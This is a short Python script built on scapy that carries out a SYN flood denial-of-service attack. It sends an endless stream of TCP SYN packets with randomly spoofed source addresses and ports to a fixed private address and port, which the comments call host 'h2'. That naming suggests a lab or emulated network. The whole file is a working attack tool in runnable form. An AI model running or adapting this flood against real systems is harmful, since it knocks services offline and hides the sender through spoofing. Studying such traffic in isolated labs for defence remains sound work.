from scapy.all import *
import random
import time

def syn_flood():
    server_ip = "192.168.2.2"  # h2's IP address
    server_port = 12345  # Port to attack

    print(f"[*] Starting SYN flood attack on {server_ip}:{server_port}...")

    while True:
        # Generate a random source IP and port for spoofing
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        src_port = random.randint(1024, 65535)
        
        # Build the SYN packet
        seq = random.randint(1000, 9000)  # Random sequence number
        syn = IP(src=src_ip, dst=server_ip) / TCP(sport=src_port, dport=server_port, flags="S", seq=seq)
        
        # Send the SYN packet
        send(syn, verbose=False)
        print(f"[+] Sent SYN packet from {src_ip}:{src_port} to {server_ip}:{server_port}")

        # Optional: Adjust speed of attack
        time.sleep(0.01)  # 10ms delay to reduce network saturation (adjust as needed)

if __name__ == "__main__":
    #try:
    syn_flood()
    #except KeyboardInterrupt:
        #print("\n[!] Stopping SYN flood attack.")
